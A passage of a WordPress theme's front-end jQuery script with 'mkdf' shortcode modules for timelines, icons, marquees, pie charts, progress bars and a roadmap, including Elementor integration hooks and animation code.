			var eventStyle = window.getComputedStyle(selectedEvent.get(0), null),
				eventLeft = eventStyle.getPropertyValue("left"),
				eventWidth = eventStyle.getPropertyValue("width");
			
			eventLeft = Number(eventLeft.replace('px', '')) + Number(eventWidth.replace('px', '')) / 2;
			
			var scaleValue = eventLeft / totWidth;
			
			setTransformValue(filling.get(0), 'scaleX', scaleValue);
		}
		
		function setDatePosition(timelineComponents, min) {
			for (var i = 0; i < timelineComponents['timelineDates'].length; i++) {
				var distance = daydiff(timelineComponents['timelineDates'][0], timelineComponents['timelineDates'][i]),
					distanceNorm = Math.round(distance / timelineComponents['eventsMinLapse']) + 2;
				
				timelineComponents['timelineEvents'].eq(i).css('left', distanceNorm * min + 'px');
			}
		}
		
		function setTimelineWidth(timelineComponents, width) {
			var timeSpan = daydiff(timelineComponents['timelineDates'][0], timelineComponents['timelineDates'][timelineComponents['timelineDates'].length - 1]),
				timeSpanNorm = timeSpan / timelineComponents['eventsMinLapse'],
				timeSpanNorm = Math.round(timeSpanNorm) + 4,
				totalWidth = timeSpanNorm * width;
			
			if (totalWidth < timelineComponents['timelineNavWrapperWidth']) {
				totalWidth = timelineComponents['timelineNavWrapperWidth'];
			}
			
			timelineComponents['timelineNavInner'].css('width', totalWidth + 'px');
			
			updateFilling(timelineComponents['timelineNavInner'].find('a.mkdf-selected'), timelineComponents['fillingLine'], totalWidth);
			updateTimelinePosition('next', timelineComponents['timelineNavInner'].find('a.mkdf-selected'), timelineComponents);
			
			return totalWidth;
		}
		
		function updateVisibleContent(event, timelineEventContent) {
			var eventDate = event.data('date'),
				visibleContent = timelineEventContent.find('.mkdf-selected'),
				selectedContent = timelineEventContent.find('[data-date="' + eventDate + '"]'),
				selectedContentHeight = selectedContent.height(),
				classEnetering = 'mkdf-selected mkdf-enter-left',
				classLeaving = 'mkdf-leave-right';
		
			if (selectedContent.index() > visibleContent.index()) {
				classEnetering = 'mkdf-selected mkdf-enter-right';
				classLeaving = 'mkdf-leave-left';
			}
			
			selectedContent.attr('class', classEnetering);
			
			visibleContent.attr('class', classLeaving).one('webkitAnimationEnd oanimationend msAnimationEnd animationend', function () {
				visibleContent.removeClass('mkdf-leave-right mkdf-leave-left');
				selectedContent.removeClass('mkdf-enter-left mkdf-enter-right');
			});
			
			timelineEventContent.css('height', selectedContentHeight + 'px');
		}
		
		function updateOlderEvents(event) {
			event.parent('li').prevAll('li').children('a').addClass('mkdf-older-event').end().end().nextAll('li').children('a').removeClass('mkdf-older-event');
		}
		
		function getTranslateValue(timeline) {
			var timelineStyle = window.getComputedStyle(timeline.get(0), null),
				timelineTranslate = timelineStyle.getPropertyValue("-webkit-transform") || timelineStyle.getPropertyValue("-moz-transform") || timelineStyle.getPropertyValue("-ms-transform") || timelineStyle.getPropertyValue("-o-transform") || timelineStyle.getPropertyValue("transform"),
				translateValue = 0;
			
			if (timelineTranslate.indexOf('(') >= 0) {
				var timelineTranslate = timelineTranslate.split('(')[1];
				
				timelineTranslate = timelineTranslate.split(')')[0];
				timelineTranslate = timelineTranslate.split(',');
				
				translateValue = timelineTranslate[4];
			}
			
			return Number(translateValue);
		}
		
		function setTransformValue(element, property, value) {
			element.style["-webkit-transform"] = property + "(" + value + ")";
			element.style["-moz-transform"] = property + "(" + value + ")";
			element.style["-ms-transform"] = property + "(" + value + ")";
			element.style["-o-transform"] = property + "(" + value + ")";
			element.style["transform"] = property + "(" + value + ")";
		}
		
		//based on http://stackoverflow.com/questions/542938/how-do-i-get-the-number-of-days-between-two-dates-in-javascript
		function parseDate(events) {
			var dateArrays = [];
			
			events.each(function () {
				var singleDate = $(this),
					dateCompStr = new String(singleDate.data('date')),
					dayComp = ['2000', '0', '0'],
					timeComp = ['0', '0'];
				
				if ( dateCompStr.length === 4 ) { //only year
					dayComp = [dateCompStr, '0', '0'];
				} else {
					var dateComp = dateCompStr.split('T');
					
					dayComp = dateComp[0].split('/'); //only DD/MM/YEAR
					
					if (dateComp.length > 1) { //both DD/MM/YEAR and time are provided
						dayComp = dateComp[0].split('/');
						timeComp = dateComp[1].split(':');
					} else if (dateComp[0].indexOf(':') >= 0) { //only time is provide
						timeComp = dateComp[0].split(':');
					}
				}
				
				var newDate = new Date(dayComp[2], dayComp[1] - 1, dayComp[0], timeComp[0], timeComp[1]);
				
				dateArrays.push(newDate);
			});
			
			return dateArrays;
		}
		
		function daydiff(first, second) {
			return Math.round((second - first));
		}
		
		function minLapse(dates) {
			//determine the minimum distance among events
			var dateDistances = [];
			
			for (var i = 1; i < dates.length; i++) {
				var distance = daydiff(dates[i - 1], dates[i]);
				dateDistances.push(distance);
			}
			
			return Math.min.apply(null, dateDistances);
		}
		
		/*
		 How to tell if a DOM element is visible in the current viewport?
		 http://stackoverflow.com/questions/123999/how-to-tell-if-a-dom-element-is-visible-in-the-current-viewport
		 */
		function elementInViewport(el) {
			var top = el.offsetTop;
			var left = el.offsetLeft;
			var width = el.offsetWidth;
			var height = el.offsetHeight;
			
			while (el.offsetParent) {
				el = el.offsetParent;
				top += el.offsetTop;
				left += el.offsetLeft;
			}
			
			return (
				top < (window.pageYOffset + window.innerHeight) &&
				left < (window.pageXOffset + window.innerWidth) &&
				(top + height) > window.pageYOffset &&
				(left + width) > window.pageXOffset
			);
		}
		
		function checkMQ() {
			//check if mobile or wilmertop device
			return window.getComputedStyle(document.querySelector('.mkdf-horizontal-timeline'), '::before').getPropertyValue('content').replace(/'/g, "").replace(/"/g, "");
		}
		
		return {
			init: function () {
				(timelines.length > 0) && initTimeline(timelines);
			}
		}
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var icon = {};
	mkdf.modules.icon = icon;
	
	
	icon.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfIcon().init();
	}

    /*
	 All functions to be called on $(window).load() should be in this function
	*/
    function mkdfOnWindowLoad() {
        mkdfElementorIcon();
    }

    /**
     * Elementor
     */
    function mkdfElementorIcon(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_icon.default', function() {
                mkdfIcon().init();
            } );
        });
    }

	/**
	 * Object that represents icon shortcode
	 * @returns {{init: Function}} function that initializes icon's functionality
	 */
	var mkdfIcon = function() {
		var icons = $('.mkdf-icon-shortcode');
		
		/**
		 * Function that triggers icon animation and icon animation delay
		 */
		var iconAnimation = function(icon) {
			if(icon.hasClass('mkdf-icon-animation')) {
				icon.appear(function() {
					icon.parent('.mkdf-icon-animation-holder').addClass('mkdf-icon-animation-show');
				}, {accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			}
		};
		
		/**
		 * Function that triggers icon hover color functionality
		 */
		var iconHoverColor = function(icon) {
			if(typeof icon.data('hover-color') !== 'undefined') {
				var changeIconColor = function(event) {
					event.data.icon.css('color', event.data.color);
				};
				
				var iconElement = icon.find('.mkdf-icon-element');
				var hoverColor = icon.data('hover-color');
				var originalColor = iconElement.css('color');
				
				if(hoverColor !== '') {
					icon.on('mouseenter', {icon: iconElement, color: hoverColor}, changeIconColor);
					icon.on('mouseleave', {icon: iconElement, color: originalColor}, changeIconColor);
				}
			}
		};
		
		/**
		 * Function that triggers icon holder background color hover functionality
		 */
		var iconHolderBackgroundHover = function(icon) {
			if(typeof icon.data('hover-background-color') !== 'undefined') {
				var changeIconBgColor = function(event) {
					event.data.icon.css('background-color', event.data.color);
				};
				
				var hoverBackgroundColor = icon.data('hover-background-color');
				var originalBackgroundColor = icon.css('background-color');
				
				if(hoverBackgroundColor !== '') {
					icon.on('mouseenter', {icon: icon, color: hoverBackgroundColor}, changeIconBgColor);
					icon.on('mouseleave', {icon: icon, color: originalBackgroundColor}, changeIconBgColor);
				}
			}
		};
		
		/**
		 * Function that initializes icon holder border hover functionality
		 */
		var iconHolderBorderHover = function(icon) {
			if(typeof icon.data('hover-border-color') !== 'undefined') {
				var changeIconBorder = function(event) {
					event.data.icon.css('border-color', event.data.color);
				};
				
				var hoverBorderColor = icon.data('hover-border-color');
				var originalBorderColor = icon.css('borderTopColor');
				
				if(hoverBorderColor !== '') {
					icon.on('mouseenter', {icon: icon, color: hoverBorderColor}, changeIconBorder);
					icon.on('mouseleave', {icon: icon, color: originalBorderColor}, changeIconBorder);
				}
			}
		};
		
		return {
			init: function() {
				if(icons.length) {
					icons.each(function() {
						iconAnimation($(this));
						iconHoverColor($(this));
						iconHolderBackgroundHover($(this));
						iconHolderBorderHover($(this));
					});
				}
			}
		};
	};

    icon.mkdfIcon = mkdfIcon;
	
})(jQuery);
(function($) {
	'use strict';
	
	var iconListItem = {};
	mkdf.modules.iconListItem = iconListItem;
	
	iconListItem.mkdfInitIconList = mkdfInitIconList;
	
	
	iconListItem.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitIconList().init();
	}


    /*
 All functions to be called on $(window).load() should be in this function
*/
    function mkdfOnWindowLoad() {
        mkdfElementorIconList();
    }

    /**
     * Elementor
     */
    function mkdfElementorIconList(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_icon_list_item.default', function() {
                mkdfInitIconList().init();
            } );
        });
    }

	/**
	 * Button object that initializes icon list with animation
	 * @type {Function}
	 */
	var mkdfInitIconList = function() {
		var iconList = $('.mkdf-animate-list');
		
		/**
		 * Initializes icon list animation
		 * @param list current slider
		 */
		var iconListInit = function(list) {
			setTimeout(function(){
				list.appear(function(){
					list.addClass('mkdf-appeared');
				},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			},30);
		};
		
		return {
			init: function() {
				if(iconList.length) {
					iconList.each(function() {
						iconListInit($(this));
					});
				}
			}
		};
	};
	
})(jQuery);
(function ($) {
    'use strict';

    var iconWithText = {};
    mkdf.modules.iconWithText = iconWithText;

    iconWithText.mkdfInitIconWithText = mkdfInitIconWithText;


    iconWithText.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());
    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfInitIconWithText().init();
    }

    /**
    All functions to be called on $(window).load() should be in this function
    */
    function mkdfOnWindowLoad() {
        mkdfElementorIconWithText();
    }

    /**
     * Elementor
     */
    function mkdfElementorIconWithText(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_icon_with_text.default', function() {
                mkdf.modules.icon.mkdfIcon().init();
                mkdfInitIconWithText().init();
            } );
        });
    }


    /**
     * Button object that initializes whole button functionality
     * @type {Function}
     */
    var mkdfInitIconWithText = function () {
        //all buttons on the page
        var icons = $('.mkdf-iwt');

        /**
         * Initializes button hover color
         * @param button current button
         */
        var iwtHoverColor = function (icon) {
            if (typeof icon.data('title-hover-color') !== 'undefined') {
                var iconTitle = icon.find('.mkdf-iwt-title a'),
                    originalColor = icon.data('title-color'),
                    hoverColor = icon.data('title-hover-color');

                iconTitle.on('mouseenter', function(){
                    $(this).css('color', hoverColor);
                });

                iconTitle.on('mouseleave', function(){
                    $(this).css('color', originalColor);
                });
            }
        };

        return {
            init: function () {
                if (icons.length) {
                    icons.each(function () {
                        iwtHoverColor($(this));
                    });
                }
            }
        };
    };

})(jQuery);
(function ($) {
	'use strict';
	
	var imageGallery = {};
	mkdf.modules.imageGallery = imageGallery;


	imageGallery.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfElementorImageGallery();
	}

    /**
     * Elementor
     */
	function mkdfElementorImageGallery() {
		$(window).on('elementor/frontend/init', function () {
			elementorFrontend.hooks.addAction('frontend/element_ready/mkdf_image_gallery.default', function () {
				mkdf.modules.common.mkdfOwlSlider();
				mkdf.modules.common.mkdfInitGridMasonryListLayout();
			});
		});
	}
	
})(jQuery);
(function($) {
    'use strict';
    
    var imageMarquee = {};
    mkdf.modules.imageMarquee = imageMarquee;
    
    imageMarquee.mkdfImageMarquee = mkdfImageMarquee;
    
    imageMarquee.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfImageMarquee();
    }

    /**
	 All functions to be called on $(window).load() should be in this function
	*/
    function mkdfOnWindowLoad() {
        mkdfElementorImageMarquee();
    }

    /**
     * Elementor
     */
    function mkdfElementorImageMarquee(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_image_marquee.default', function() {
                mkdfImageMarquee();
            } );
        });
    }

    /**
     * Init Image Marquee Shortcode
     */
    function mkdfImageMarquee() {
        var imageMarqueeShortcodes = $('.mkdf-image-marquee');

        if (imageMarqueeShortcodes.length) {
            imageMarqueeShortcodes.each(function(){
                var imageMarqueeShortcode = $(this),
                    marqueeElements = imageMarqueeShortcode.find('.mkdf-image'),
                    originalItem = marqueeElements.filter('.mkdf-original'),
                    auxItem = marqueeElements.filter('.mkdf-aux');

                var marqueeEffect = function () {
                	var delta = 1, //pixel movement
                	    speedCoeff = 0.5, // below 1 to slow down, above 1 to speed up
                	    currentPos,
                	    marqueeWidth,
                	    resizing = false;

                	var marqueeReset = function() {
                	    marqueeWidth = originalItem.width();
                	    currentPos = 0; 
                	    originalItem.css({
                	        'left': 0
                	    });
                	    auxItem.css({
                	        'width': marqueeWidth, //same width as the original marquee element
                	        'left': marqueeWidth //set to the right of the original marquee element
                	    });
                	}

               		marqueeReset();
	                mkdfRequestAnimationFrame();

                    //movement loop
                    marqueeElements.each(function(i){
                        var marqueeElement = $(this);

                        //movement loop
                        var mkdfMarqueeSequence = function() {
                            currentPos -= delta;

                            //reset marquee element
                            if (marqueeElement.position().left <= -marqueeWidth) {
                                marqueeElement.css('left', parseInt(marqueeWidth - delta));
                                currentPos = 0;
                            }

                            //move marquee element
                            if (!resizing) {
                            	marqueeElement.css({
                            	    'transform': 'translate3d('+speedCoeff*currentPos+'px,0,0)'
                            	});
                            }

                            //fix overlap issue if occurs
                            if (Math.abs(originalItem.position().left - auxItem.position().left) < marqueeWidth - 1) {
                                marqueeReset();
                            }
                        
                            //repeat
                            requestNextAnimationFrame(mkdfMarqueeSequence);
                        }; 
                            
                        mkdfMarqueeSequence();
                    });

                    var intialOrientation = mkdf.windowHeight > mkdf.windowWidth ? 'portrait' : 'landscape';
	                //reset marquee on resize end
	                $(window).resize(function(){
                        var newOrientation = mkdf.windowHeight > mkdf.windowWidth ? 'portrait' : 'landscape';

                        //check if resize is real resize on touch devices since on mobile scrolling will trigger resize when sticky address bar appears/hides
						if( newOrientation !== intialOrientation && mkdf.html.hasClass('touch')) {
                            if (!resizing) {
                                resizing = true;
                                imageMarqueeShortcode.stop().animate({opacity: 0}, 200, function () {
                                    marqueeReset();
                                    resizing = false;
                                    imageMarqueeShortcode.delay(200).animate({opacity: 1}, 200);
                                });
                            }
                        }
	                });
                };

            	//init
                imageMarqueeShortcode.waitForImages(function(){
	                marqueeEffect();
	            });
            });
        }
    }
    
    /*
     * Request Animation Frame shim
     */
	function mkdfRequestAnimationFrame() {
		window.requestNextAnimationFrame =
			(function () {
				var originalWebkitRequestAnimationFrame = undefined,
					wrapper = undefined,
					callback = undefined,
					geckoVersion = 0,
					userAgent = navigator.userAgent,
					index = 0,
					self = this;
				
				// Workaround for Chrome 10 bug where Chrome
				// does not pass the time to the animation function
				
				if (window.webkitRequestAnimationFrame) {
					// Define the wrapper
					
					wrapper = function (time) {
						if (time === undefined) {
							time = +new Date();
						}
						
						self.callback(time);
					};
					
					// Make the switch
					
					originalWebkitRequestAnimationFrame = window.webkitRequestAnimationFrame;
					
					window.webkitRequestAnimationFrame = function (callback, element) {
						self.callback = callback;
						
						// Browser calls the wrapper and wrapper calls the callback
						
						originalWebkitRequestAnimationFrame(wrapper, element);
					};
				}
				
				// Workaround for Gecko 2.0, which has a bug in
				// mozRequestAnimationFrame() that restricts animations
				// to 30-40 fps.
				
				if (window.mozRequestAnimationFrame) {
					// Check the Gecko version. Gecko is used by browsers
					// other than Firefox. Gecko 2.0 corresponds to
					// Firefox 4.0.
					
					index = userAgent.indexOf('rv:');
					
					if (userAgent.indexOf('Gecko') != -1) {
						geckoVersion = userAgent.substr(index + 3, 3);
						
						if (geckoVersion === '2.0') {
							// Forces the return statement to fall through
							// to the setTimeout() function.
							
							window.mozRequestAnimationFrame = undefined;
						}
					}
				}
				
				return window.requestAnimationFrame   ||
					window.webkitRequestAnimationFrame ||
					window.mozRequestAnimationFrame    ||
					window.oRequestAnimationFrame      ||
					window.msRequestAnimationFrame     ||
					
					function (callback, element) {
						var start,
							finish;
						
						window.setTimeout( function () {
							start = +new Date();
							callback(start);
							finish = +new Date();
							
							self.timeout = 1000 / 60 - (finish - start);
							
						}, self.timeout);
					};
				}
			)();
	}

})(jQuery);
(function ($) {
	'use strict';
	
	var imageWithText = {};
	mkdf.modules.imageWithText = imageWithText;


	imageWithText.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfElementorImageWithText();
	}

    /**
     * Elementor
     */
	function mkdfElementorImageWithText() {
		$(window).on('elementor/frontend/init', function () {
			elementorFrontend.hooks.addAction('frontend/element_ready/mkdf_image_with_text.default', function () {
				mkdf.modules.common.mkdfAppearingSection();
			});
		});
	}
	
})(jQuery);
(function($) {
    'use strict';

    var interactiveLinkShowcase = {};
    mkdf.modules.interactiveLinkShowcase = interactiveLinkShowcase;

    interactiveLinkShowcase.mkdfInitInteractiveLinkShowcase = mkdfInitInteractiveLinkShowcase;
    interactiveLinkShowcase.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());


    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfInitInteractiveLinkShowcase();
    }

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorInteractiveLinkShowcase();
    }

    /**
     * Elementor
     */
    function mkdfElementorInteractiveLinkShowcase(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_interactive_link_showcase.default', function() {
                mkdfInitInteractiveLinkShowcase();
            } );
        });
    }

    /**
     * Init item showcase shortcode
     */
    function mkdfInitInteractiveLinkShowcase() {
        var interactiveLinkShowcase = $('.mkdf-ils-holder');
	
	    if (interactiveLinkShowcase.length) {
		    interactiveLinkShowcase.each(function(){
			    var thisInteractiveLinkShowcase = $(this),
				    singleImage = thisInteractiveLinkShowcase.find('.mkdf-ils-item-image'),
				    singleLink  = thisInteractiveLinkShowcase.find('.mkdf-ils-item-link');
			    
			    singleImage.eq(0).addClass('mkdf-active');
			    thisInteractiveLinkShowcase.find('.mkdf-ils-item-link[data-index="0"]').addClass('mkdf-active');
			
			    singleLink.children().on('touchstart mouseenter', function() {
				    var thisLink = $(this).parent(),
					    index = parseInt( thisLink.data('index'), 10 );
				
				    singleImage.removeClass('mkdf-active').eq(index).addClass('mkdf-active');
				    singleLink.removeClass('mkdf-active');
				    thisInteractiveLinkShowcase.find('.mkdf-ils-item-link[data-index="'+index+'"]').addClass('mkdf-active');
			    });
		    });
	    }
    }

})(jQuery);
(function($) {
	'use strict';
	
	var itemShowcase = {};
	mkdf.modules.itemShowcase = itemShowcase;
	
	itemShowcase.mkdfInitItemShowcase = mkdfInitItemShowcase;
	
	
	itemShowcase.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitItemShowcase();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorItemShowcase();
    }

    /**
     * Elementor
     */
    function mkdfElementorItemShowcase(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_item_showcase.default', function() {
                mkdfInitItemShowcase();
            } );
        });
    }

	/**
	 * Init item showcase shortcode
	 */
	function mkdfInitItemShowcase() {
		var itemShowcase = $('.mkdf-item-showcase-holder');
		
		if (itemShowcase.length) {
			itemShowcase.each(function(){
				var thisItemShowcase = $(this),
					leftItems = thisItemShowcase.find('.mkdf-is-left'),
					rightItems = thisItemShowcase.find('.mkdf-is-right'),
					itemImage = thisItemShowcase.find('.mkdf-is-image');
				
				//logic
				leftItems.wrapAll( "<div class='mkdf-is-item-holder mkdf-is-left-holder' />");
				rightItems.wrapAll( "<div class='mkdf-is-item-holder mkdf-is-right-holder' />");
				thisItemShowcase.animate({opacity:1},200);
				
				setTimeout(function(){
					thisItemShowcase.appear(function(){
						itemImage.addClass('mkdf-appeared');
						thisItemShowcase.on('webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend',
							function(e) {
								if(mkdf.windowWidth > 1200) {
									itemAppear('.mkdf-is-left-holder .mkdf-is-item');
									itemAppear('.mkdf-is-right-holder .mkdf-is-item');
								} else {
									itemAppear('.mkdf-is-item');
								}
							});
					},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
				},100);
				
				//appear animation trigger
				function itemAppear(itemCSSClass) {
					thisItemShowcase.find(itemCSSClass).each(function(i){
						var thisListItem = $(this);
						setTimeout(function(){
							thisListItem.addClass('mkdf-appeared');
						}, i*150);
					});
				}
			});
		}
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var pieChart = {};
	mkdf.modules.pieChart = pieChart;
	
	pieChart.mkdfInitPieChart = mkdfInitPieChart;
	
	
	pieChart.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitPieChart();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorPieChart();
    }

    /**
     * Elementor
     */
    function mkdfElementorPieChart(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_pie_chart.default', function() {
                mkdfInitPieChart();
            } );
        });
    }


    /**
	 * Init Pie Chart shortcode
	 */
	function mkdfInitPieChart() {
		var pieChartHolder = $('.mkdf-pie-chart-holder');
		
		if (pieChartHolder.length) {
			pieChartHolder.each(function () {
				var thisPieChartHolder = $(this),
					pieChart = thisPieChartHolder.children('.mkdf-pc-percentage'),
					barColor = '#22365c',
					trackColor = '#f2f3f5',
					lineWidth = 5,
                    size = 176;
				
				if(typeof pieChart.data('size') !== 'undefined' && pieChart.data('size') !== '') {
					size = pieChart.data('size');
				}
				
				if(typeof pieChart.data('bar-color') !== 'undefined' && pieChart.data('bar-color') !== '') {
					barColor = pieChart.data('bar-color');
				}
				
				if(typeof pieChart.data('track-color') !== 'undefined' && pieChart.data('track-color') !== '') {
					trackColor = pieChart.data('track-color');
				}
				
				pieChart.appear(function() {
					initToCounterPieChart(pieChart);
					thisPieChartHolder.css('opacity', '1');
					
					pieChart.easyPieChart({
						barColor: barColor,
						trackColor: false,
						scaleColor: false,
						lineCap: 'butt',
						lineWidth: lineWidth,
						animate: 1500,
						size: size
					});
				},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			});
		}
	}
	
	/*
	 **	Counter for pie chart number from zero to defined number
	 */
	function initToCounterPieChart(pieChart){
		var counter = pieChart.find('.mkdf-pc-percent'),
			max = parseFloat(counter.text());
		
		counter.countTo({
			from: 0,
			to: max,
			speed: 1500,
			refreshInterval: 50
		});
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var process = {};
	mkdf.modules.process = process;
	
	process.mkdfInitProcess = mkdfInitProcess;
	
	
	process.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitProcess()
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorProcess();
    }

    /**
     * Elementor
     */
    function mkdfElementorProcess(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_pie_chart.default', function() {
                mkdfInitProcess();
            } );
        });
    }


    /**
	 * Inti process shortcode on appear
	 */
	function mkdfInitProcess() {
		var holder = $('.mkdf-process-holder');
		
		if(holder.length) {
			holder.each(function(){
				var thisHolder = $(this);
				
				thisHolder.appear(function(){
					thisHolder.addClass('mkdf-process-appeared');
				},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			});
		}
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var progressBar = {};
	mkdf.modules.progressBar = progressBar;
	
	progressBar.mkdfInitProgressBars = mkdfInitProgressBars;
	
	
	progressBar.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitProgressBars();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorProgressBars();
    }

    /**
     * Elementor
     */
    function mkdfElementorProgressBars(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_progress_bar.default', function() {
                mkdfInitProgressBars();
            } );
        });
    }


    /*
     **	Horizontal progress bars shortcode
     */
	function mkdfInitProgressBars() {
		var progressBar = $('.mkdf-progress-bar');
		
		if (progressBar.length) {
			progressBar.each(function () {
				var thisBar = $(this),
					thisBarContent = thisBar.find('.mkdf-pb-content'),
					progressBar = thisBar.find('.mkdf-pb-percent'),
					percentage = thisBarContent.data('percentage');
				
				thisBar.appear(function () {
					mkdfInitToCounterProgressBar(progressBar, percentage);
					
					thisBarContent.css('width', '0%').animate({'width': percentage + '%'}, 2000);
					
					if (thisBar.hasClass('mkdf-pb-percent-floating')) {
						progressBar.css('left', '0%').animate({'left': percentage + '%'}, 2000);
					}
				});
			});
		}
	}
	
	/*
	 **	Counter for horizontal progress bars percent from zero to defined percent
	 */
	function mkdfInitToCounterProgressBar(progressBar, percentageValue){
		var percentage = parseFloat(percentageValue);
		
		if(progressBar.length) {
			progressBar.each(function() {
				var thisPercent = $(this);
				thisPercent.css('opacity', '1');
				
				thisPercent.countTo({
					from: 0,
					to: percentage,
					speed: 2000,
					refreshInterval: 50
				});
			});
		}
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var roadmap = {};
	mkdf.modules.roadmap = roadmap;

	roadmap.mkdfInitRoadmap = mkdfInitRoadmap;

	roadmap.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitRoadmap();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorRoadmap();
    }

    /**
     * Elementor
     */
    function mkdfElementorRoadmap(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_roadmap.default', function() {
                mkdfInitRoadmap();
            } );
        });
    }


    function mkdfInitRoadmap() {
		var roadmap = $('.mkdf-roadmap');
		
		if (roadmap.length) {
			roadmap.each(function () {
				var thisRoadmap = $(this),
					roadMapHolder = thisRoadmap.find('.mkdf-roadmap-holder'),
					roadmapItemsHolder = thisRoadmap.find('.mkdf-roadmap-inner-holder'),
					roadmapItems = thisRoadmap.find('.mkdf-roadmap-item'),
					visibleItems = 5,
					roadmapInitalWidth = thisRoadmap.width(),
					roadmapHolderWidth = 0,
					itemsWidth,
					itemsHeight = 0,
					itemReached = roadmapItems.filter('.mkdf-roadmap-reached-item').last(),
					prevArrow = thisRoadmap.find('.mkdf-rl-arrow-left'),
					nextArrow = thisRoadmap.find('.mkdf-rl-arrow-right'),
					firstActive,
					lastActive,
					translateCurrent = 0,
					moving = false;

				itemReached.siblings().remove('mkdf-roadmap-reached-item');
				itemReached.prevAll().addClass('mkdf-roadmap-passed-item');

				//set width for items and holder, also set classes and first and last active items
				var setWidths = function(){
					roadmapInitalWidth = thisRoadmap.width();

					if (mkdf.windowWidth > 1024) {
						visibleItems = 5;
					} else if (mkdf.windowWidth > 680) {
						visibleItems = 3;
					} else {
						visibleItems = 1;
					}

					itemsWidth = roadmapInitalWidth/visibleItems;

					roadmapItems.each(function () {
						var thisItem = $(this),
							thisItemHeight;

						thisItem.width(itemsWidth);
						roadmapHolderWidth += itemsWidth;

						//needs to be here in order to calculate height right because of the width
